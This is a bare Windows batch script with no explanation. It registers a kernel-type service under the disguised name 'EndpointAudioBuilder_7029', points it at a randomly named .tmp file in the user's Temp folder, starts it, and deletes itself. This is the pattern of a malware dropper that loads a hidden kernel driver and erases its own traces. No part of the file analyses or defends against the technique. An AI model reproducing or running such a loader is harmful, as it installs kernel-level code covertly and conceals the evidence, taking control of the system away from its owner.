@echo off
cd %~dp0
sc create EndpointAudioBuilder_7029 binpath=C:\Users\%username%\AppData\Local\Temp\39de3374-aa2c-4a91-97ae-b356c3d94216.tmp type=kernel
sc start EndpointAudioBuilder_7029
del "%~f0"



